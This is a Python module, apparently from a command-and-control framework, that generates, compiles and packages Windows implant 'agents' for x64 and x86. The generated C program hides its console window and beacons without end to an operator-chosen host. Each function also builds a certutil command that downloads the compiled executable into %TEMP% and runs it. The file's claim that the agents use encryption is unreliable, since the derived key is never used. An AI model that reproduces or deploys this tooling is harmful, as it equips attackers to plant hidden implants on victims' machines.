import os
import platform
import subprocess
import hashlib
import base64

def generate_cmd_shellcodex64_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Generate a key from the campaign name
    campaign_key = hashlib.sha256(campaign_name.encode()).hexdigest()[:32]
    
    # Generate C code for the shellcode with encryption support
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <windows.h>
    #include <wininet.h>
    #include <wincrypt.h>

    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "crypt32.lib")

    // Campaign derived encryption key
    const char* CAMPAIGN_NAME = "{campaign_name}";
    
    // Simple SHA256 implementation for key derivation
    void sha256_string(const char* input, char* output) {{
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        DWORD dwHashLen = 0;
        DWORD dwCount = 0;
        BYTE rgbHash[32];
        CHAR rgbDigits[] = "0123456789abcdef";
        
        if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            strcpy(output, "ERROR");
            return;
        }}
        
        if(!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
            CryptReleaseContext(hProv, 0);
            strcpy(output, "ERROR");
            return;
        }}
        
        if(!CryptHashData(hHash, (BYTE*)input, strlen(input), 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            strcpy(output, "ERROR");
            return;
        }}
        
        dwHashLen = 32;
        if(!CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &dwHashLen, 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            strcpy(output, "ERROR");
            return;
        }}
        
        for(dwCount = 0; dwCount < dwHashLen; dwCount++) {{
            output[dwCount*2] = rgbDigits[rgbHash[dwCount] >> 4];
            output[dwCount*2+1] = rgbDigits[rgbHash[dwCount] & 0xf];
        }}
        
        output[dwCount*2] = 0;
        
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }}

    // Get encryption key derived from campaign name
    void get_encryption_key(BYTE* key) {{
        char hash[65];
        sha256_string(CAMPAIGN_NAME, hash);
        
        // Copy first 32 bytes of hash as key
        for(int i = 0; i < 32; i++) {{
            sscanf(&hash[i*2], "%2hhx", &key[i]);
        }}
    }}

    void executeShellcode() {{
        // Setting up connectivity to C2
        HINTERNET hInternet = InternetOpen("ShellcodeAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {{
            return;
        }}
        
        // Format C2 server URL
        char serverUrl[256];
        sprintf(serverUrl, "{('https' if ssl else 'http')}://{host}:{port}/beacon");
        
        // Beacon to C2
        HINTERNET hConnect = InternetOpenUrl(hInternet, serverUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect != NULL) {{
            InternetCloseHandle(hConnect);
        }}
        
        InternetCloseHandle(hInternet);
        
        // Sleep for a while (beacon interval)
        Sleep(5000);
    }}

    int main() {{
        // Hide console window if not in debug mode
        #ifndef DEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
        
        // Initialize encryption key
        BYTE key[32];
        get_encryption_key(key);
        
        // Execute shellcode logic in a loop
        while (1) {{
            executeShellcode();
        }}
        
        return 0;
    }}
    """
    
    # Save the C file
    c_file_path = os.path.join(agents_folder, "shellcode_x64.c")
    with open(c_file_path, "w") as f:
        f.write(c_code)
    
    # Compile the shellcode if system has a C compiler
    exe_path = os.path.join(agents_folder, "shellcode_x64.exe")
    compile_result = "Shellcode C file generated. Compilation "
    
    try:
        if platform.system() == "Windows":
            compiler_command = f"cl {c_file_path} /Fe:{exe_path} /O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += f"failed: {compilation.stderr}"
        else:
            # For cross-compilation on non-Windows platforms
            compiler_command = f"x86_64-w64-mingw32-gcc {c_file_path} -o {exe_path} -lwininet -lcrypt32 -s -O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += "failed. You may need to install mingw-w64 for cross-compilation."
    except Exception as e:
        compile_result += f"failed: {str(e)}"
    
    # Generate a cmd command to download and execute the shellcode
    http = "https" if ssl else "http"
    cmd_payload = f"cmd.exe /c certutil -urlcache -split -f {http}://{host}:{port}/shellcode_x64.exe %TEMP%\\sc.exe && %TEMP%\\sc.exe"
    
    # Save full payload information
    result = f"CMD Shellcodex64 agent generated:\n\n1. C source saved to: {c_file_path}\n2. {compile_result}\n3. Execution command:\n{cmd_payload}\n4. Uses encryption with campaign name: {campaign_name}"
    with open(os.path.join(agents_folder, "cmd_shellcodex64.txt"), "w") as f:
        f.write(result)
    
    return result

def generate_cmd_shellcodex86_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Generate a key from the campaign name
    campaign_key = hashlib.sha256(campaign_name.encode()).hexdigest()[:32]
    
    # Generate C code for the shellcode with encryption support
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <windows.h>
    #include <wininet.h>
    #include <wincrypt.h>

    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "crypt32.lib")

    // Campaign derived encryption key
    const char* CAMPAIGN_NAME = "{campaign_name}";
    
    // Simple SHA256 implementation for key derivation
    void sha256_string(const char* input, char* output) {{
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        DWORD dwHashLen = 0;
        DWORD dwCount = 0;
        BYTE rgbHash[32];
        CHAR rgbDigits[] = "0123456789abcdef";
        
        if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            strcpy(output, "ERROR");
            return;
        }}
        
        if(!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
            CryptReleaseContext(hProv, 0);
            strcpy(output, "ERROR");
            return;
        }}
        
        if(!CryptHashData(hHash, (BYTE*)input, strlen(input), 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            strcpy(output, "ERROR");
            return;
        }}
        
        dwHashLen = 32;
        if(!CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &dwHashLen, 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            strcpy(output, "ERROR");
            return;
        }}
        
        for(dwCount = 0; dwCount < dwHashLen; dwCount++) {{
            output[dwCount*2] = rgbDigits[rgbHash[dwCount] >> 4];
            output[dwCount*2+1] = rgbDigits[rgbHash[dwCount] & 0xf];
        }}
        
        output[dwCount*2] = 0;
        
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }}

    // Get encryption key derived from campaign name
    void get_encryption_key(BYTE* key) {{
        char hash[65];
        sha256_string(CAMPAIGN_NAME, hash);
        
        // Copy first 32 bytes of hash as key
        for(int i = 0; i < 32; i++) {{
            sscanf(&hash[i*2], "%2hhx", &key[i]);
        }}
    }}

    void executeShellcode() {{
        // Setting up connectivity to C2
        HINTERNET hInternet = InternetOpen("ShellcodeAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {{
            return;
        }}
        
        // Format C2 server URL
        char serverUrl[256];
        sprintf(serverUrl, "{('https' if ssl else 'http')}://{host}:{port}/beacon");
        
        // Beacon to C2
        HINTERNET hConnect = InternetOpenUrl(hInternet, serverUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect != NULL) {{
            InternetCloseHandle(hConnect);
        }}
        
        InternetCloseHandle(hInternet);
        
        // Sleep for a while (beacon interval)
        Sleep(5000);
    }}

    int main() {{
        // Hide console window if not in debug mode
        #ifndef DEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
        
        // Initialize encryption key
        BYTE key[32];
        get_encryption_key(key);
        
        // Execute shellcode logic in a loop
        while (1) {{
            executeShellcode();
        }}
        
        return 0;
    }}
    """
    
    # Save the C file
    c_file_path = os.path.join(agents_folder, "shellcode_x86.c")
    with open(c_file_path, "w") as f:
        f.write(c_code)
    
    # Compile the shellcode if system has a C compiler
    exe_path = os.path.join(agents_folder, "shellcode_x86.exe")
    compile_result = "Shellcode C file generated. Compilation "
    
    try:
        if platform.system() == "Windows":
            compiler_command = f"cl {c_file_path} /Fe:{exe_path} /O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += f"failed: {compilation.stderr}"
        else:
            # For cross-compilation on non-Windows platforms
            compiler_command = f"i686-w64-mingw32-gcc {c_file_path} -o {exe_path} -lwininet -lcrypt32 -s -O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += "failed. You may need to install mingw-w64 for cross-compilation."
    except Exception as e:
        compile_result += f"failed: {str(e)}"
    
    # Generate a cmd command to download and execute the shellcode
    http = "https" if ssl else "http"
    cmd_payload = f"cmd.exe /c certutil -urlcache -split -f {http}://{host}:{port}/shellcode_x86.exe %TEMP%\\sc.exe && %TEMP%\\sc.exe"
    
    # Save full payload information
    result = f"CMD Shellcodex86 agent generated:\n\n1. C source saved to: {c_file_path}\n2. {compile_result}\n3. Execution command:\n{cmd_payload}\n4. Uses encryption with campaign name: {campaign_name}"
    with open(os.path.join(agents_folder, "cmd_shellcodex86.txt"), "w") as f:
        f.write(result)
    
    return result